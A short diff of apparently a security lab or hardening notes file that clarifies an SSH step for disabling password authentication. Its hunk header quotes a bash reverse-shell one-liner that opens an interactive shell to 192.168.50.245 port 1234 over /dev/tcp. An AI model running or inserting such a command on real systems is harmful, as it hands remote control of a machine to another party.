@@ -174,7 +174,7 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * Run ./ssh.sh to create ssh keys.
 * Go to the ssh configuration file /etc/ssh/sshd_config
 * Allow public key authentication
-* Disable password authentication
+* Disable password authentication by changing PasswordAuthentication yes to PasswordAuthentication no 
 * sudo systemctl restart ssh
 
 # References
